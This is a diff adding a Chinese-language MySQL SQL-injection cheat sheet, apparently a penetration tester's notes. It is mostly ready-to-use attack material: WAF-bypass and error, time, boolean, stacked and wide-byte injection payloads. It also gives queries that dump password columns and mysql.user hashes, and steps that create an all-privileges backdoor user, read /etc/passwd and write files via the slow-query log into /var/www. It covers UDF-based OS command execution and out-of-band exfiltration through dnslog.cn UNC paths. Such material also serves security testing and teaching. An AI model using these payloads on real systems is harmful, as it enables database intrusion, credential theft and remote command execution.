@@ -1,0 +1,1125 @@
+# MySQL 注入备忘录
+
+## 官方文档
+
+    
+    
+    https://dev.mysql.com/doc/refman/5.7/en/
+    https://dev.mysql.com/doc/index-archive.html
+
+## 测试环境
+
+  * 在线环境
+
+    
+    
+    https://dbfiddle.uk/?rdbms=mysql_5.7
+
+  * docker
+
+    
+    
+    #!/bin/sh
+    # https://hub.docker.com/_/mysql
+    # username: root password: 123456
+    
+    docker stop mysql-5.5.60
+    docker container rm mysql-5.5.60
+    docker run --name mysql-5.5.60 -e MYSQL_ROOT_PASSWORD=123456 -d -p 3306:3306 mysql:5.5.60
+
+## 检测POC
+
+### poc
+
+    
+    
+    # error fuzz
+    1`]"'(
+    1`]\x81"\x81'(
+    
+    # error
+    eXTraCTvaLUe(1,0x214d79357131)
+    uPDatEXml(1,0x214d79357131,1)
+    # 0x214D79357131 == '!My5q1'
+    
+    # time
+    SlEeP(6)
+    BeNcHmArK(POw(10,9),Md5(0))
+    
+    # oob
+    LoAD_FilE('\\\\{host}1{parameter}.{dnslog}\\i')
+    # Windows UNC路径
+
+### boundary
+
+    
+    
+    '|{poc}|'
+    "||{poc}||"
+    {poc}
+    If(0,1,{poc})
+    asc,{poc}
+    asc,If(0,1,{poc})
+    all {poc},
+    {raw_number} PrOcEdUrE AnAlYsE(eXTraCTvaLUe(1,{poc}),1)
+    (SeLEcT!{poc})
+    {raw_string}|{poc}
+    {raw_string}`|{poc}|`{raw_string}
+    (SeLEcT!{poc}){random_string}
+    {raw_string},(SeLEcT!{poc}){random_string}
+    {raw_string}),((select!{poc}){random_string}
+    {raw_string}`,(SeLEcT!{poc})`{random_string}
+    {raw_string}`),((select!{poc})`{random_string}
+    
+    # 宽字节+转义
+    \x81'|{poc}#
+    \x81'|{poc})#
+    \x81'|{poc}))#
+    \x81'|{poc})))#
+    \x81"|{poc}#
+    \x81"|{poc})#
+    \x81"|{poc}))#
+    \x81"|{poc})))#
+
+## 绕过WAF
+
+[WAF绕过之SQL注入](https://xz.aliyun.com/t/7767)
+
+    
+    
+    SELECT/*!19999(table_name*//*!19999)a*/FROM(select!0)t/*!19999,*//*!19999information_schema*//*!19999.*//*!19999tables*/
+    SELECT{a(table_name)}FROM{x(/*!19999information_schema*//*!19999.*//*!19999tables*/)}
+    select++++/*xxx*/++user()
+    
+    # 注释符
+    SELECT 1, 2, 3/*!12345UNION SELECT 4, 5, 6*/;
+    SELECT 1, 2, 3/*!UNION SELECT 4, 5, 6*/;
+    SELECT 1#comment;
+    SELECT 1-- comment;
+    SELECT/*comment*/1;
+    SELECT#comment\n1;
+    SELECT-- comment\n1;
+    
+    # 空白字符
+    %09%0A%0B%0C%0D%20
+    
+    # 标识分割符
+    ``
+
+## 常用EXP
+
+### current sql
+
+    
+    
+    # 从进程中查询出当前执行的sql
+    SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE '%673245283%' LIMIT 1
+    # 从进程中查询出当前执行的sql, {prefix}之前的sql字符串
+    SELECT SUBSTRING_INDEX(INFO,{prefix},1) FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE '%673245283%' LIMIT 1
+    # 从进程中查询出当前执行的sql, {suffix}之后的sql字符串
+    SELECT SUBSTRING_INDEX(INFO,{suffix},-1) FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE '%673245283%' LIMIT 1
+    
+    # 查询出当前执行的SQL后，构造union或者stack注入
+
+### all in one
+
+    
+    
+    SELECT {column1},{column2},{column3} FROM {table} WHERE 1=1 LIMIT 0,5
+    
+    # 安全处理null值 有列类型不能自动转换为字符串时会报错,需要手动类型转换为字符串
+    SELECT group_concat(concat_ws('1qAZ',ifnull({column1},0x20),ifnull({column2},0x20),ifnull({column3},0x20)) separator '2wSX') FROM (SELECT * FROM {table} WHERE 1=1 LIMIT 0,5)t
+    
+    # 有null值会混乱列的顺序
+    SELECT group_concat(concat_ws('1qAZ',{column1},{column2},{column3}) separator '2wSX') FROM (SELECT * FROM {table} WHERE 1=1 LIMIT 0,5)t
+
+### info
+
+    
+    
+    SELECT concat_ws(0x0a,
+    ifnull(@@secure_file_priv,0),
+    concat_ws(0x3a, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),
+    concat_ws(0x3a, @@hostname, @@port),
+    concat_ws(0x3a, user(), database()),
+    concat_ws(0x3a, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)
+    )
+    
+    # 结果
+    NULL
+    5.5.60:linux-glibc2.12:x86_64:MySQL Community Server (GPL)
+    6696754dd0c5:3306
+    root@192.168.168.10
+    /var/lib/mysql/:/usr/local/mysql/lib/plugin/:/tmp:/usr/local/mysql/
+
+### is dba
+
+    
+    
+    # 当前用户是否dba
+    SELECT (SELECT super_priv FROM mysql.user WHERE user=substring_index(user(), 0x40, 1) LIMIT 1)='Y'
+    # true
+    
+    # {user}是否dba
+    SELECT super_priv FROM mysql.user WHERE user={user} LIMIT 1
+    # 'Y'
+
+### search column
+
+    
+    
+    # LIKE和RLIKE默认都不区分大小写
+    
+    # 数据库、表、列
+    SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name RLIKE 'password|passwd|pwd'
+    # 数据库、表、列 (all in one)
+    SELECT group_concat(concat_ws(0x2c,table_schema,table_name,column_name) separator 0x0a) FROM (SELECT * FROM information_schema.columns WHERE column_name RLIKE 'password|passwd|pwd' LIMIT 0,5)t
+    
+    # 当前数据库的表、列
+    SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database() and column_name RLIKE 'password|passwd|pwd'
+    # 当前数据库的表、列 (all in one)
+    SELECT group_concat(concat_ws(0x2c,table_name,column_name) separator 0x0a) FROM (SELECT * FROM information_schema.columns WHERE table_schema=database() and column_name RLIKE 'password|passwd|pwd' LIMIT 0,5)t
+    
+    # 当前数据库的表
+    SELECT table_name FROM information_schema.columns WHERE table_schema=database() and column_name RLIKE 'password|passwd|pwd'
+    # 当前数据库的表 (all in one)
+    SELECT group_concat(table_name) FROM (SELECT * FROM information_schema.columns WHERE table_schema=database() and column_name RLIKE 'password|passwd|pwd' LIMIT 0,5)t
+
+### list columns
+
+    
+    
+    # 列名、列类型、是否可为空
+    SELECT column_name,column_type,is_nullable FROM information_schema.columns WHERE table_schema={db} AND table_name={table} LIMIT 0,5
+    
+    # 列名、列类型、是否可为空 (all in one)
+    SELECT group_concat(concat_ws(0x2c,column_name,column_type,is_nullable) separator 0x0a) FROM (SELECT * FROM information_schema.columns WHERE table_schema={db} AND table_name={table} LIMIT 0,5)t
+    
+    # 列名
+    SELECT column_name FROM information_schema.columns WHERE table_schema={db} AND table_name={table} LIMIT 0,5
+    
+    # 列名 (all in one)
+    SELECT group_concat(column_name) FROM (SELECT * FROM information_schema.columns WHERE table_schema={db} AND table_name={table} LIMIT 0,5)t
+
+### dump table
+
+    
+    
+    SELECT {column1},{column2},{column3} FROM {table} WHERE 1=1 LIMIT 0,5
+    
+    # 安全处理null值 有列类型不能自动转换为字符串时会报错,需要手动类型转换为字符串
+    SELECT group_concat(concat_ws('1qAZ',ifnull({column1},0x20),ifnull({column2},0x20),ifnull({column3},0x20)) separator '2wSX') FROM (SELECT * FROM {table} WHERE 1=1 LIMIT 0,5)t
+    
+    # 有null值会混乱列的顺序
+    SELECT group_concat(concat_ws('1qAZ',{column1},{column2},{column3}) separator '2wSX') FROM (SELECT * FROM {table} WHERE 1=1 LIMIT 0,5)t
+
+### add user
+
+    
+    
+    CREATE USER 'test999'@'%' IDENTIFIED BY '!QAZ1qaz';
+    GRANT ALL PRIVILEGES ON *.* TO 'test999'@'%';
+    DROP USER test999;
+
+## 加密函数
+
+    
+    
+    SELECT HEX('abc')
+    SELECT UNHEX('616263')
+    
+    SELECT TO_BASE64('abc')
+    SELECT FROM_BASE64('JWJj')
+    
+    SELECT COMPRESS('abc')
+    SELECT UNCOMPRESS(COMPRESS('abc'))
+    
+    SELECT ENCODE('abcdef', 'pass')
+    SELECT DECODE(ENCODE('abcdef', 'pass'), 'pass')
+    
+    SELECT AES_ENCRYPT('abcdef', 'pass')
+    SELECT AES_DECRYPT(AES_ENCRYPT('abcdef', 'pass'), 'pass')
+
+## 文件操作
+
+[系统变量](https://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_secure_file_priv)
+`@@secure_file_priv`用于限制数据导入和导出操作的效果，例如由`LOAD DATA`和`SELECT ... INTO
+OUTFILE`语句和`LOAD_FILE()`函数执行的操作。只有具有FILE特权的用户才能进行这些操作。`@@secure_file_priv`默认值(@@version
+≥ 5.6.34)系统平台相关，一般为NULL；(@@version ≤ 5.6.33)空字符串。
+
+### 读文件
+
+#### LOAD_FILE
+
+    
+    
+    SELECT load_file('/etc/passwd')
+    SELECT hex(load_file('/etc/passwd'))
+    SELECT CONVERT(LOAD_FILE('/etc/passwd') USING utf8)
+    
+    # 读取文件并以字符串形式返回文件内容。要使用此功能，文件必须位于服务器主机上，必须指定文件的完整路径名，并且必须具有FILE特权。该文件必须全部可读，并且其大小小于 max_allowed_packet字节。如果secure_file_priv系统变量设置为非空目录名称，则要加载的文件必须位于该目录中。如果文件不存在或由于不满足前述条件之一而无法读取，则该函数返回NULL。
+
+#### LOAD DATA INFILE
+
+    
+    
+    CREATE TABLE tmp_blob(tmp BLOB);
+    LOAD DATA INFILE 'C:\\tools\\tmp\\1.txt' INTO TABLE tmp_blob FIELDS TERMINATED BY 'xfdhgdhf' LINES TERMINATED BY 'fydgtgtgt';
+    select tmp from tmp_blob;
+    
+    # 读取服务端二进制文件
+    
+    CREATE TABLE tmp_text(tmp TEXT);
+    LOAD DATA INFILE 'C:\\tools\\tmp\\1.txt' INTO TABLE tmp_text FIELDS TERMINATED BY 'xfdhgdhf' LINES TERMINATED BY 'fydgtgtgt';
+    select tmp from tmp_text;
+    
+    # 读取服务端文本文件
+
+#### LOAD DATA LOCAL INFILE
+
+    
+    
+    CREATE TABLE tmp_blob(tmp BLOB);
+    LOAD DATA LOCAL INFILE 'C:\\tools\\tmp\\1.txt' INTO TABLE tmp_blob FIELDS TERMINATED BY 'xfdhgdhf' LINES TERMINATED BY 'fydgtgtgt';
+    select tmp from tmp_blob;
+    
+    # 读取客户端二进制文件
+    
+    CREATE TABLE tmp_text(tmp TEXT);
+    LOAD DATA LOCAL INFILE 'C:\\tools\\tmp\\1.txt' INTO TABLE tmp_text FIELDS TERMINATED BY 'xfdhgdhf' LINES TERMINATED BY 'fydgtgtgt';
+    select tmp from tmp_text;
+    
+    # 读取客户端文本文件
+
+### 写文件
+
+#### SELECT ... INTO OUTFILE
+
+    
+    
+    SELECT null,0x3eff3e,null INTO OUTFILE 'C:\\tools\\tmp\\8.txt' FIELDS TERMINATED BY '' LINES TERMINATED BY ''
+    # SELECT ... INTO OUTFILE将选定的行写入文件。可以指定列和行终止符以产生特定的输出格式。
+
+#### SELECT ... INTO DUMPFILE
+
+    
+    
+    SELECT null,0x3eff3e,null INTO DUMPFILE 'C:\\tools\\tmp\\8.txt'
+    
+    # 将单行写入文件而没有任何格式，MySQL仅将一行写入文件，没有任何列或行终止，也没有执行任何转义处理。这对于选择一个BLOB值并将其存储在文件中很有用。
+
+#### 修改日志路径写文件
+
+    
+    
+    # 查询慢查询日志参数
+    SELECT concat_ws(0x2c, @@slow_query_log, @@slow_query_log_file, @@long_query_time)
+    # 设置慢查询日志路径
+    set global slow_query_log_file='/var/www/api_test.php';
+    # 启用慢查询日志
+    set global slow_query_log=1;
+    # 触发慢查询写日志
+    SELECT 'xxxx', sleep(@@long_query_time+1)
+    # 恢复慢查询日志参数
+    set global slow_query_log_file='raw_path';set global slow_query_log=0;
+    
+    
+    # 错误日志：记录启动、运行或停止mysqld时出现的问题。
+    SELECT @@log_error
+    # 通用日志：记录建立的客户端连接和执行的语句。
+    SELECT concat_ws(0x2c, @@general_log, @@general_log_file)
+    # 慢查询日志：记录所有执行时间超过long_query_time秒的所有查询或不使用索引的查询。
+    SELECT concat_ws(0x2c, @@slow_query_log, @@slow_query_log_file, @@long_query_time)
+
+## 命令执行
+
+### 条件
+
+  1. Mysql版本大于等于5.1版本，udf文件必须放置于MYSQL安装目录下的lib\plugin文件夹下；Mysql版本小于5.1版本，udf文件在Windows2003下放置于`c:\windows\system32`，在windows2000下放置于`c:\winnt\system32`。
+  2. 有权限创建udf函数
+  3. 可以将udf文件写入到相应目录。
+
+### 操作
+
+    
+    
+    # mysql5.1以上版本默认情况下/lib/plugin目录是不存在的
+    # linux系统一般需要root权限运行mysql才能对插件目录写文件
+    # udf源码 https://github.com/sqlmapproject/udfhack
+    
+    # 查找mysql插件目录目录
+    SELECT @@plugin_dir
+    # 利用NTFS ADS创建lib目录
+    select 1 into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';
+    # 利用NTFS ADS创建plugin目录
+    select 1 into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
+    # 写udf文件
+    SELECT 0xffff INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll'
+    # 创建udf函数，这里的函数名应该与dll文件中的函数名一致。
+    create function runsh returns string soname 'udf.dll';
+    # 执行系统命令
+    select runsh('whoami');
+    # 删除创建的函数
+    drop function runsh;
+
+## 全部PAYLOAD
+
+    
+    
+    # error
+    extractvalue(1,concat(0x2a,pi()))
+    updatexml(1,concat(0x2a,pi()),1)
+    (select!(0)from(select!min(0),concat(pi(),rand(98)>0.5)x from information_schema.plugins group by x)a limit 1)
+    linestring((select!(0)from(select*from(select-pi())a)b))
+    polygon((select!(0)from(select*from(select-pi())a)b))
+    geometrycollection((select!(0)from(select*from(select-pi())a)b))
+    multipoint((select!(0)from(select*from(select-pi())a)b))
+    multilinestring((select!(0)from(select*from(select-pi())a)b))
+    multipolygon((select!(0)from(select*from(select-pi())a)b))
+    exp(~1+(select*from(select-pi())a))
+    pow(9,~1+(select*from(select-pi())a))
+    (1+(if((select*from(select-pi())s),~0,~0)))
+    gtid_subset(pi(),1)
+    json_keys(concat(0x2a,pi()))
+    json_depth(concat(0x2a,pi()))
+    json_length(concat(0x2a,pi()))
+    
+    # time and bool(false)
+    sleep(5)
+    benchmark(pow(10,8),md5(0))
+    ('xxxxxxxxxxxx' rlike '((((x+)+)+)+)+y')
+    ('xxxxxxxxxxxx' regexp '((((x+)+)+)+)+y')
+    
+    # bool
+    1
+    0
+    (1-0)
+    (1-1)
+    (4*1)
+    (4*0)
+    cos(0)
+    sin(0)
+    
+    # oob
+    load_file('\\\\My5q1.y8mhtv.dnslog.cn\\i')
+    
+    # 函数值
+    pi()= 3.14159
+    md5(0) = 'cfcd208495d565ef66e7dff9f98764da'
+    sleep(5) = false
+    benchmark(pow(10,8),md5(0)) = false
+
+## 检测技术
+
+### error注入
+
+#### rand函数导致主键重复报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 AND (SELECT 1 FROM (SELECT MIN(1),CONCAT(({payload}), RAND(98)>0.5)x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a limit 1)
+    SELECT * FROM information_schema.tables WHERE 1=1 AND (SELECT 1 FROM (SELECT MIN(1),CONCAT(({payload}), RAND(98)>0.5)x FROM (SELECT 1 UNION SELECT 2)y GROUP BY x)a limit 1)
+    SELECT * FROM information_schema.tables WHERE 1=1 AND (SELECT 1 FROM (SELECT MIN(1),CONCAT(({payload}), FLOOR(RAND(98)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a limit 1)
+    
+    # (mysql >= 4.1) 聚合函数创建的虚拟表主键含有rand函数，由于rand函数的多次计算，导致主键重复报错，rand函数种子为98时，表的行数只需要大于1就可以触发主键重复报错，报错返回值回显最大长度为64字节
+
+#### 非法几何类值报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 AND LineString((select 1 from (select * from ({payload})a)b))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND Polygon((select 1 from (select * from ({payload})a)b))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND GeometryCollection((select 1 from (select * from ({payload})a)b))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND MultiPoint((select 1 from (select * from ({payload})a)b))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND MultiLineString((select 1 from (select * from ({payload})a)b))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND MultiPolygon((select 1 from (select * from ({payload})a)b))
+    
+    # (mysql >= 5.0) 解析期间发现非法的几何值，报错返回值回显没有长度限制
+
+#### xpath语法错误报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 AND ExtractValue(1, concat(0x2a, ({payload})))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND UpdateXML(1, concat(0x2a, ({payload})), 1)
+    
+    # (mysql >= 5.1) 报错返回值回显最大长度为32字节，第一个字符为*时不计入报错返回值
+
+#### GTID集格式报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 AND GTID_SUBSET(({payload}),1)
+    
+    # (mysql >= 5.6) 格式错误的GTID集规范，报错返回值回显没有长度限制
+
+#### json字符串格式报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 AND json_keys(concat(0x2a, ({payload})))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND json_depth(concat(0x2a, ({payload})))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND json_length(concat(0x2a, ({payload})))
+    
+    # (mysql >= 5.7.8) 格式错误的json字符串
+
+#### DOUBLE溢出报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 AND exp(~1+(select * from ({payload})a))
+    SELECT * FROM information_schema.tables WHERE 1=1 AND pow(9,~1+(select * from ({payload})a))
+    
+    # (mysql >= 5.5) DOUBLE值超出范围报错，少部分版本能出数据，报错返回值回显没有长度限制
+
+#### BIGINT UNSIGNED溢出报错
+
+    
+    
+    SELECT * FROM information_schema.tables WHERE 1=1 and (1+(IF((SELECT * FROM ({payload})s), ~0, ~0)))
+    
+    # (mysql >= 5.5) BIGINT UNSIGNED值超出2**64-1(18446744073709551615 = ~0)报错，少部分版本能出数据，报错返回值回显没有长度限制
+
+### bool注入
+
+    
+    
+    # true
+    1
+    (1-0)
+    (4*1)
+    cos(0)
+    !sleep(5)
+    !benchmark(pow(10,8),md5(0))
+    
+    # false
+    0
+    (1-1)
+    (4*0)
+    sin(0)
+    sleep(5)
+    benchmark(pow(10,8),md5(0))
+
+### time注入
+
+    
+    
+    sleep(5)
+    # 睡眠参数给出的秒数，然后返回0,当被中断时返回1
+    
+    benchmark(pow(10,4),md5(0))
+    # 运行指定表达式指定次数，返回0
+    
+    ('xxxxxxxxxxxx' rlike '((((x+)+)+)+)+y')
+    ('xxxxxxxxxxxx' regexp '((((x+)+)+)+)+y')
+    # 正则匹配指数爆炸，最大执行时间取决于@@regexp_time_limit和@@regexp_stack_limit
+    
+    (select-count(*)from`information_schema`.columns`1`,`information_schema`.columns`2`,`information_schema`.columns`3`,`information_schema`.columns`4`)
+    # 多表join指数爆炸
+
+### union注入
+
+    
+    
+    order by 1#
+    order by 1000#
+    # 没有通用的poc，关键在于正确构造union查询，order by语句判断查询的列数
+
+### stack注入
+
+    
+    
+    ;select!sleep(5)#
+    ;select!benchmark(pow(10,8),md5(0))#
+    # 没有通用的poc，关键在于正确构造多语句
+
+### inline注入
+
+    
+    
+    (select md5(0))
+    (select pow(7,4))
+    (select sleep(4))
+    (select benchmark(pow(10,8),md5(0)))
+    # 内联查询注入，注入点一般是非值的注入，比如列名、表名
+
+### oob注入
+
+out-of-band带外数据是一种通过其他传输方式来窃取数据的技术。OOB技术通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，通过这些请求泄露数据。OOB攻击的成功基于出口防火墙规则，即是否允许来自易受攻击的系统和外围防火墙的出站请求。域名由一系列以点分隔的标签组成，每个标签最长可为
+63 个字节，只能包含字符 a-z、0-9 和 -（连字符）。域名的总长度不能超过 255 字节，包括点。
+
+    
+    
+    SELECT load_file(concat('\\\\',md5(5),'xxxx.dnslog.cn\\i'))
+    SELECT load_file(concat('\\\\',hex({payload}),'xxxx.dnslog.cn\\i'))
+    
+    # mysql中没有能直接造成oob请求的函数，只有当操作系统为windows时，利用UNC路径读写文件才能发起oob请求。
+
+### second注入
+
+从不可信数据源（比如用户可控的数据库字段）获取的数据拼接到sql语句中执行。比如将用户输入的数据存到数据库中，再取出用户存储的数据拼接执行sql。
+
+    
+    
+    sleep(5)
+    '|sleep(5)|'
+    "|sleep(5)|"
+    
+    benchmark(pow(10,8),md5(0))
+    '|benchmark(pow(10,8),md5(0))|'
+    "|benchmark(pow(10,8),md5(0))|"
+
+### 宽字节注入
+
+ascii码大于127的字符和转义字符`\`组成宽字节字符，从而造成单引号或者双引号逃逸，进而导致sql注入
+
+    
+    
+    \x81'|extractvalue(1,0x214D79357131)#
+    \x81"|extractvalue(1,0x214D79357131)#
+    
+    \x81'|sleep(5)#
+    \x81"|sleep(5)#
+
+## 备忘录
+
+操作 | SQL | 备注  
+---|---|---  
+cast | `CAST({expr} AS NCHAR); CONVERT({expr} ,NCHAR)` |
+将expr转为固定长度的unicode数据，最大长度为4000个字符  
+length | `LENGTH({str}); CHAR_LENGTH({str})` | 字节长度和字符长度  
+isnull | `IFNULL({expr},' ')` | 如果expr为NULL，返回空格，否则返回%s  
+delimiter | `,` | 分隔符  
+limit | `LIMIT {limit}; LIMIT {offset},{limit}; LIMIT {limit} OFFSET {offset}`
+| 限制limit行，偏移offset  
+order | `ORDER BY {column1} ASC; ORDER BY {column1} DESC; ORDER BY {column1}
+DESC,{column2} ASC` | 按照column1,column2列排序  
+count | `COUNT({expr})` | expr的行数  
+comment | `SELECT 1, 2, 3/*!12345UNION SELECT 4, 5, 6*/; SELECT 1, 2,
+3/*!UNION SELECT 4, 5, 6*/; SELECT 1#comment; SELECT 1-- comment;
+SELECT/*comment*/1; SELECT#comment\n1; SELECT-- comment\n1` |
+内联注释，版本号必须为5位数字(\n为换行符)  
+substring | `MID({str},{pos}); MID({str} FROM {pos}); MID({str},{pos},{len});
+MID({str} FROM {pos} FOR {len})` | mid('abc', 1, 1) = 'a'; MID() = SUBSTR() =
+SUBSTRING()  
+concatenate | ```CONCAT({str1},{str2},...);
+CONCAT_WS({sep},{str1},{str2},...); GROUP_CONCAT([DISTINCT] expr [,expr ...]
+[ORDER BY {unsigned_integer | col_name | expr} [ASC | DESC] [,col_name ...]]
+[SEPARATOR str_val])``` | CONCAT参数中有一个为NULL ，则返回值为 NULL; CONCAT_WS分隔符为
+NULL，则结果为 NULL。忽略任何分隔符参数后的 NULL 值。  
+case | `SELECT IF({expr1}, {expr2}, {expr3}); SELECT (CASE WHEN {expr1} THEN
+{expr2} ELSE {expr3} END); SELECT IFNULL(ELT({expr1}, {expr2}), {expr3})` |
+expr1为真，返回expr2，否则返回expr3  
+hex | `HEX({str})` | hex编码，返回值不带0x  
+inference | `ORD(MID({str},{pos},1))>{ord}; ASCII(MID({str},{pos},1))>{ascii}`
+| 二分查找  
+banner | `SELECT concat_ws(0x2c, @@version_compile_os,
+@@version_compile_machine, @@version_comment, @@version); SELECT version()` |
+Linux,x86_64,MySQL Community Server (GPL),5.6.51  
+current_user | `SELECT user(), system_user(), session_user(); SELECT
+current_user()` | 客户端提供的用户名和主机名(root@192.168.1.5); 经过身份验证的用户名和主机名  
+current_db | `SELECT database(), schema()` | 当前数据库  
+hostname | `SELECT concat_ws(0x2c, @@hostname, @@bind_address, @@port)` |
+@@bind_address变量需要版本 >= 5.6  
+table_comment | `SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE
+table_schema={db} AND table_name={table}` | 查询表的备注  
+column_comment | `SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE
+table_schema={db} AND table_name={table} AND column_name={column}` | 查询列的备注  
+is_dba | `(SELECT super_priv FROM mysql.user WHERE user={user} LIMIT 0,1)='Y'`
+| user是否管理员用户  
+check_udf | `(SELECT name FROM mysql.func WHERE name={function} LIMIT
+0,1)={function}` | 查询udf函数function是否创建成功  
+users | `SELECT group_concat(DISTINCT grantee) FROM
+INFORMATION_SCHEMA.USER_PRIVILEGES; SELECT group_concat(DISTINCT user) FROM
+mysql.user` | 查询全部用户  
+passwords | `SELECT DISTINCT user,password FROM mysql.user; SELECT DISTINCT
+user,authentication_string FROM mysql.user` | 查询mysql用户密码  
+privileges | `SELECT grantee,privilege_type FROM
+INFORMATION_SCHEMA.USER_PRIVILEGES; SELECT user, select_priv, insert_priv,
+update_priv, delete_priv, create_priv, drop_priv, reload_priv, shutdown_priv,
+process_priv, file_priv, grant_priv, references_priv, index_priv, alter_priv,
+show_db_priv, super_priv, create_tmp_table_priv, lock_tables_priv,
+execute_priv, repl_slave_priv, repl_client_priv, create_view_priv,
+show_view_priv, create_routine_priv, alter_routine_priv, create_user_priv FROM
+mysql.user` | 查询用户权限  
+statements | `SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE
+'%INFORMATION_SCHEMA.PROCESSLIST%'` | 查询当前执行的sql语句  
+dbs | `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA; SELECT db FROM
+mysql.db` | 查询数据库名  
+tables | `SELECT table_schema, table_name FROM INFORMATION_SCHEMA.TABLES;
+SELECT database_name, table_name FROM mysql.innodb_table_stats` | 查询表名  
+columns | `SELECT column_name, column_type FROM INFORMATION_SCHEMA.COLUMNS
+WHERE table_name={table} AND table_schema={db}` | 查询列名  
+dump_table | `SELECT {columns} FROM {db}.{table}` | dump表  
+search_db | `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA; SELECT db
+FROM mysql.db` | 查找数据库名  
+search_table | `SELECT table_schema, table_name FROM
+INFORMATION_SCHEMA.TABLES` | 查找表名  
+search_column | `SELECT table_schema, table_name, column_name FROM
+INFORMATION_SCHEMA.COLUMNS` | 查找列名  
+      
+    
+    <dbms value="MySQL">
+            <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
+            <cast query="CAST(%s AS NCHAR)"/>
+            <length query="CHAR_LENGTH(%s)"/>
+            <isnull query="IFNULL(%s,' ')"/>
+            <delimiter query=","/>
+            <limit query="LIMIT %d,%d"/>
+            <limitregexp query="\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)" query2="\s+LIMIT\s+([\d]+)"/>
+            <limitgroupstart query="1"/>
+            <limitgroupstop query="2"/>
+            <limitstring query=" LIMIT "/>
+            <order query="ORDER BY %s ASC"/>
+            <count query="COUNT(%s)"/>
+            <comment query="-- -" query2="/*" query3="#"/>
+            <substring query="MID((%s),%d,%d)"/>
+            <concatenate query="CONCAT(%s,%s)"/>
+            <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
+            <hex query="HEX(%s)"/>
+            <inference query="ORD(MID((%s),%d,1))>%d"/>
+            <banner query="VERSION()"/>
+            <current_user query="CURRENT_USER()"/>
+            <current_db query="DATABASE()"/>
+            <hostname query="@@HOSTNAME"/>
+            <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
+            <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
+            <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
+            <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
+            <users>
+                <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+                <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+            </users>
+            <!-- https://github.com/dev-sec/mysql-baseline/issues/35 -->
+            <!-- https://stackoverflow.com/a/31122246 -->
+            <passwords>
+                <inband query="SELECT user,authentication_string FROM mysql.user" condition="user"/>
+                <blind query="SELECT DISTINCT(authentication_string) FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(authentication_string)) FROM mysql.user WHERE user='%s'"/>
+            </passwords>
+            <privileges>
+                <inband query="SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES" condition="grantee" query2="SELECT user,select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user" condition2="user"/>
